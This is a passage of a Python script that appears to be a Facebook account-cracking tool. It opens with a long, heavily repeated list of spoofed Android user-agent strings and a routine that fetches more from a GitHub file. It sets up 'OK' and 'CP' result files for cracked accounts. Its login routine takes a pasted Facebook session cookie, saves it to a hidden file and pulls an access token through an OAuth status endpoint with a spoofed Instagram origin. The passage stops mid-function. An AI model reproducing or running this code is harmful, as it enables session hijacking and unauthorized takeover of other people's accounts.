Chrome/66.0.369.183 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; GT-S7898I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4719.74 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; GT-C3322i) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4884.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; GT-19505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4724.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; CPH1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.5530.40 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; M2101K9G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3907.285 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; CPH1831) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3089.274 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; 22011119TI Build/M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3864.261 UCBrowser/1.1.0.4034 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; M2102K1AC Build/C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.1096.198 UCBrowser/2.5.0.1541 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; GT-S5253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4029.107 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.2238.303 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2621.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1176.139 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3LII Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.4098.231 UCBrowser/9.10.0.209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.369.183 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; GT-S7898I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4719.74 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; GT-C3322i) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4884.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; GT-19505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4724.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; CPH1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.5530.40 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; M2101K9G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3907.285 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; CPH1831) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3089.274 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; 22011119TI Build/M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3864.261 UCBrowser/1.1.0.4034 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; M2102K1AC Build/C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.1096.198 UCBrowser/2.5.0.1541 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; GT-S5253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4029.107 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.2238.303 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; J737R4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.4087.293 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2621.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1176.139 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3LII Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.4098.231 UCBrowser/9.10.0.209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.369.183 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; GT-S7898I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4719.74 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; GT-C3322i) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4884.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; GT-19505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4724.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; CPH1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.5530.40 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; M2101K9G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3907.285 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; CPH1831) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3089.274 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; 22011119TI Build/M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3864.261 UCBrowser/1.1.0.4034 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; M2102K1AC Build/C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.1096.198 UCBrowser/2.5.0.1541 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; GT-S5253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4029.107 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.2238.303 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; J737R4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.4087.293 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; M2010J19SL Build/W) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4455.236 UCBrowser/12.4.0.1010 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2621.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1176.139 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3LII Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.4098.231 UCBrowser/9.10.0.209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.369.183 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; GT-S7898I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4719.74 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; GT-C3322i) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4884.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; GT-19505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4724.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; CPH1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.5530.40 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; M2101K9G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3907.285 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; CPH1831) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3089.274 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; 22011119TI Build/M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3864.261 UCBrowser/1.1.0.4034 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; M2102K1AC Build/C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.1096.198 UCBrowser/2.5.0.1541 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; GT-S5253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4029.107 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.2238.303 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; J737R4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.4087.293 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; M2010J19SL Build/W) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4455.236 UCBrowser/12.4.0.1010 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; M2012K11AC Build/R) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.2237.213 UCBrowser/16.5.0.5209 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2621.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1176.139 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3LII Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.4098.231 UCBrowser/9.10.0.209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.369.183 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; GT-S7898I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4719.74 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; GT-C3322i) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4884.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; GT-19505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4724.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; CPH1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.5530.40 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; M2101K9G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3907.285 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; CPH1831) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3089.274 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; 22011119TI Build/M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3864.261 UCBrowser/1.1.0.4034 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; M2102K1AC Build/C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.1096.198 UCBrowser/2.5.0.1541 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; GT-S5253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4029.107 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.2238.303 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; J737R4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.4087.293 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; M2010J19SL Build/W) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4455.236 UCBrowser/12.4.0.1010 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; M2012K11AC Build/R) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.2237.213 UCBrowser/16.5.0.5209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; M2007J17I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.6302.80 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2621.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1176.139 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3LII Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.4098.231 UCBrowser/9.10.0.209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.369.183 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; GT-S7898I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4719.74 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; GT-C3322i) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4884.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; GT-19505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4724.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; CPH1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.5530.40 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; M2101K9G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3907.285 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; CPH1831) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3089.274 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; 22011119TI Build/M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3864.261 UCBrowser/1.1.0.4034 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; M2102K1AC Build/C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.1096.198 UCBrowser/2.5.0.1541 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; GT-S5253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4029.107 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.2238.303 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; J737R4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.4087.293 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; M2010J19SL Build/W) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4455.236 UCBrowser/12.4.0.1010 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; M2012K11AC Build/R) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.2237.213 UCBrowser/16.5.0.5209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; M2007J17I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.6302.80 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; X650C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.5077.338 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2621.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1176.139 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3LII Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.4098.231 UCBrowser/9.10.0.209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.369.183 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; GT-S7898I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4719.74 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; GT-C3322i) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4884.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; GT-19505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4724.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; CPH1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.5530.40 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; M2101K9G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3907.285 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; CPH1831) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3089.274 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; 22011119TI Build/M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3864.261 UCBrowser/1.1.0.4034 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; M2102K1AC Build/C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.1096.198 UCBrowser/2.5.0.1541 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; GT-S5253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4029.107 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.2238.303 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; J737R4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.4087.293 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; M2010J19SL Build/W) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4455.236 UCBrowser/12.4.0.1010 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; M2012K11AC Build/R) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.2237.213 UCBrowser/16.5.0.5209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; M2007J17I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.6302.80 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; X650C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.5077.338 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; M2007J1SC Build/A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.3147.10 UCBrowser/18.9.0.2446 Mobile Safari/537.36'])
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#
#------------[ WARNA-COLOR ]--------------#
R = '\x1b[1;91m'
G = '\x1b[1;92m'
Y = '\x1b[1;93m'
PU = '\x1b[1;94m'
U = '\x1b[1;95m' 
PI = '\x1b[1;96m'
N = '\x1b[0m'    
GR = "\033[1;30m"
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def ARA(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def banner():
    print(f"""{PU}
    
 ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░            
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░            
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░            
░▒▓█▓▒░      ░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░             
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░            
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░            
 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░            
                                                                 
                                                                 
░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓███████▓▒░       
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      
░▒▓██████▓▒░ ░▒▓███████▓▒░ ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░       
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░▒▓█▓▒░             
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░▒▓█▓▒░             
░▒▓█▓▒░      ░▒▓███████▓▒░   ░▒▓██▓▒░  ░▒▓█▓▒░▒▓█▓▒░             
                                                                 
                                                                 

                                            

                                    

___________________________________
TOOL CREATE BY + HaWa
VESION TOOL + 1.2✨👌
NEW UPDATE😁
____________________________________
{PU}""")
os.system('clear')
banner()
#------------------[ BAGIAN-MENU ]----------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			login(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()


def login_lagi334():
	try:
		
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		cookie=input(f'  [{h}•{x}] Enter Your Cookies :{asu} ')
		open(".cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
